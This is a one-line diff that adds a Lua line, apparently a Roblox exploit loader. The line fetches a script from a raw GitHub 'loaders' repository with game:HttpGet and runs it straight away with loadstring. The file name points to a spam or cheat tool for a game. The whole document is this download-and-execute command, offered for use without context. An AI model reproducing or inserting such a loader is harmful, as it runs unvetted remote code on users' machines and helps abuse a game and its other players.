@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/build-the-pyramid-spam3-gk8e8l27gvrajl.lua"))()
